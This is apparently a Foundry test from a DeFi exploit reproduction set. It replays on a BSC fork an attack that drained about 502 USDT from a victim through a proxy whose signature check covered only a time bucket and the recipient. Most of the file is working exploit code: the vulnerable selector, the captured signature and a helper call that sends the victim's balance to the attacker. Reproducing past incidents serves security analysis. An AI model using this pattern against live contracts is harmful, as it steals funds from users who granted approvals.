// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 502.42 USDT
// Attacker : 0x0BAD002980a744CA944f380B2007Ff9f6C31A4Ba
// Attack Contract : 0x90f21de8D1a25f6451ea5232C5B646a782Aa9cf0
// Vulnerable Contract : 0x8Fd3d01Cc65eA0E4dFFFde7Ec8159Dc99a177f0A
// Attack Tx : https://bscscan.com/tx/0xf2eeaa87a049fb914dfe8c9f1a878fa9a3aab78688107844794dacd5ada99563
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x8Fd3d01Cc65eA0E4dFFFde7Ec8159Dc99a177f0A#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1508
//
// Attack summary: The attacker called the proxy with a victim, recipient, and signature; the unverified implementation
// read the victim's USDT balance and transferred that full balance to the attacker through the victim's proxy allowance.
// Root cause: The signature only authenticated a 5-minute timestamp bucket and recipient. It did not bind the victim,
// token, amount, caller, proxy, chain, or a nonce, so any approved victim could be drained to the signed recipient.

address constant ATTACKER = 0x0BAD002980a744CA944f380B2007Ff9f6C31A4Ba;
address constant ATTACK_CONTRACT = 0x90f21de8D1a25f6451ea5232C5B646a782Aa9cf0;
address constant VICTIM = 0x3F41A2d69375fB913DDfd333e5c5942e7D72F29e;
address constant ENTRY_STATE_PROXY = 0xE641fCaE9a9e72b7417854bd9ffD2bDce203106c;
address constant VULNERABLE_CONTRACT = 0x8Fd3d01Cc65eA0E4dFFFde7Ec8159Dc99a177f0A;
address constant AUTHORIZED_SIGNER = 0xCC213E64325AF4725fb2b26FA2d822926F487CfE;
IERC20 constant USDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 54_350_435;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(USDT_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(VICTIM, "Victim");
        vm.label(ENTRY_STATE_PROXY, "Entry State Proxy");
        vm.label(VULNERABLE_CONTRACT, "Unverified Implementation");
        vm.label(address(USDT_TOKEN), "USDT");
    }

    function testExploit() public balanceLog {
        uint256 victimBalanceBefore = USDT_TOKEN.balanceOf(VICTIM);
        uint256 attackerBalanceBefore = USDT_TOKEN.balanceOf(ATTACKER);
        uint256 proxyAllowance = USDT_TOKEN.allowance(VICTIM, ENTRY_STATE_PROXY);

        assertGt(victimBalanceBefore, 500 ether, "victim should hold trace USDT balance");
        assertEq(attackerBalanceBefore, 0, "attacker starts with no USDT");
        assertGe(proxyAllowance, victimBalanceBefore, "victim allowance covered full balance");

        bytes memory signature =
            hex"16dd0346f9e72dd03f66eaea16dc301f9e5ee2387331518003fe1b2a76d544ab79acd7145f17ee446458c77ddc3379839f185bf3f028abd0959e818886c34e161c";
        bytes4 unverifiedDrainSelector = 0x97e76253;

        // The decompiled implementation verifies keccak256(abi.encodePacked(timeBucket, recipient)).
        // VICTIM and amount are not part of the signed message, but are still used in transferFrom below.
        uint256 fiveMinuteBucket = (block.timestamp / 300) * 300;
        bytes32 recipientOnlyDigest = keccak256(abi.encodePacked(fiveMinuteBucket, ATTACKER));
        assertEq(recoverSigner(recipientOnlyDigest, signature), AUTHORIZED_SIGNER, "recipient signature is valid");

        // step 1: deploy and use a local helper to mirror the short-lived initcode attack contract.
        vm.prank(ATTACKER);
        AttackHelper helper = new AttackHelper();
        vm.label(address(helper), "Local Attack Helper");

        // step 2: call the unverified proxy selector with the trace-decoded victim, recipient, and signature.
        vm.prank(ATTACKER);
        helper.execute(ENTRY_STATE_PROXY, unverifiedDrainSelector, VICTIM, ATTACKER, signature);

        // step 3: the proxy drained the victim's full USDT balance to the attacker.
        assertEq(USDT_TOKEN.balanceOf(VICTIM), 0, "victim USDT should be drained");
        assertEq(
            USDT_TOKEN.balanceOf(ATTACKER) - attackerBalanceBefore, victimBalanceBefore, "attacker received victim balance"
        );
    }

    function recoverSigner(bytes32 digest, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        return ecrecover(digest, v, r, s);
    }
}

contract AttackHelper {
    function execute(address proxy, bytes4 selector, address victim, address recipient, bytes memory signature) external {
        (bool ok,) = proxy.call(abi.encodeWithSelector(selector, victim, recipient, signature));
        require(ok, "proxy call failed");
    }
}
